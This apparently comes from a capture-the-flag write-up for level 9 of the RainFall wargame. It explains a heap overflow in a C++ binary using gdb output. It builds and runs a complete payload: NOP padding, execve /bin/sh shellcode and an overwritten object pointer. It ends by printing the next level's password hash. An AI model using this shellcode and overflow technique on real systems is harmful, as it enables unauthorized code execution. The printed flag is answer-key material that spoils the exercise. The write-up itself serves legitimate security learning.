## LEVEL 9

This level is a little more special because the original code isn't C but C++. Let's disassembling the program and find a vulnerability.

```shell
level9@RainFall:~$ gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   [...]
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   [...]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   [...]
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
```

The program don't have any `system()` or `execve()` calls, so we have to use a **ShellCode Injection**. We tried to use the same technique than in the previous level, but it didn't work, we cannot just find the EIP and change the return address.

After many research and using Ghibra we discovered a bunch of interesting things. The first one is the alloacation order, `n1` is allocated before `n2` then the program calls `setAnnotation()` on `n1`. That's means that we can overflow `n2` change the adress pointed. Another interesting thing is that return of `main()` dereferences `n2` and `n1`.

So if we write the `n2` address by overloading the `n1` string with `memcpy()` we can set `n2` address to the address of our **ShellCode**.

To create our Payload we need some informations.

---

#### The address of the start of the buffer

```shell
level9@RainFall:~$ gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) r "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Starting program: /home/user/level9/level9 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

Breakpoint 1, 0x0804867c in main ()
(gdb) x/32x $eax
0x804a00c:	0x44434241	0x48474645	0x4c4b4a49	0x504f4e4d
0x804a01c:	0x54535251	0x58575655	0x00005a59	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
```

Perfect so the start of our buffer is `0x804a00c`.

---

#### Padding

To find the padding to overflow `n2` we will use the previous output of GDB.

The address `0x08048848` is at position `0x804a078` so we just have to substract `0x804a00c` from `0x804a078` to get the padding.

0x804a078 - 0x804a00c = 0x6c -> 108.

So to overwrite `n2` we have to write 108 before the address

---

#### ShellCode

To this level I will use this ShellCode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`

*To know how to find a ShellCode read the [level2](../level2)*

---

#### The address of the start of our ShellCode

To calculate the start of our ShellCode we just have to addition the buffer adress with the distance between the address and the ShellCode.

---

### Payload

`python -c 'print "\x10\xa0\x04\x08" + "\x90"*10 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 73 + "\x0c\xa0\x04\x08"' > /tmp/payload`

Perfect, we just have to inject the payload into the program.

```shell
level9@RainFall:~$ ./level9 $(cat /tmp/payload)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```